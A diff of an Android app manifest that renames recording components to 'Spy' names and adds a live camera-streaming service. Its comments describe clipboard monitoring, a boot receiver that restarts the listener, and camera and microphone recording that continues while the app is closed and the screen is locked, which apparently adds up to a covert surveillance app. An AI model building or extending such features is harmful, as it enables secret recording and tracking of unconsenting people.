@@ -28,7 +28,7 @@
 <!--    foregroundServiceType="dataSync") - listens for copies. -->
 <!-- 3. NEW receiver .clipboard.ClipboardBootReceiver (exported=true, -->
 <!--    BOOT_COMPLETED) - restarts the listener after reboot. -->
-<!-- ThirdEye camera, ball, orientation, WhatsApp, AppLock - all kept. -->
+<!-- Spy camera, ball, orientation, WhatsApp, AppLock - all kept. -->
 <!-- BLUEFILM-CAMERA VERSION - replace your old AndroidManifest.xml with this. -->
 <!-- Based on WHATSAPP. New vs BLUEFILM (screen recorder): -->
 <!-- ThirdEyeService is now a CAMERA video recorder (front / back -->
@@ -239,11 +239,11 @@
             </intent-filter>
         </activity>
 
-        <!-- Blue Film camera video recorder: foreground service, so it
+        <!-- Spy camera video recorder: foreground service, so it
              keeps recording when the app is closed and the screen
              is locked. Not exported - only this app starts it. -->
         <service
-            android:name=".thirdeye.ThirdEyeService"
+            android:name=".spy.SpyService"
             android:exported="false"
             android:foregroundServiceType="camera|microphone" />
 
@@ -252,7 +252,7 @@
              with on-screen marks on a transparent overlay.
              Not exported - only this app starts it. -->
         <service
-            android:name=".thirdeye.ScreenRecordService"
+            android:name=".spy.SpyScreenRecordService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection|microphone" />
 
@@ -263,16 +263,24 @@
              No new permission: FOREGROUND_SERVICE_MEDIA_PROJECTION
              is already declared above. -->
         <service
-            android:name=".network.ScreenStreamService"
+            android:name=".thirdeye.ScreenStreamService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
+
+        <!-- Camera Live (2026-11-21): 1-to-1 camera sharing via the relay.
+             Camera2 foreground service - captures front/back camera and
+             sends JPEG frames over WebSocket. Not exported. -->
+        <service
+            android:name=".thirdeye.CameraLiveService"
+            android:exported="false"
+            android:foregroundServiceType="camera" />
 
         <!-- Screen recording toolbar (NEW): transparent Compose
              Activity, opens from the floating ball (or the mini
              ball) while a screen recording runs. Same pattern
              as BallPanelActivity. -->
         <activity
-            android:name=".thirdeye.ScreenRecordToolbarActivity"
+            android:name=".spy.SpyScreenRecordToolbarActivity"
             android:exported="false"
             android:excludeFromRecents="true"
             android:launchMode="singleTop"
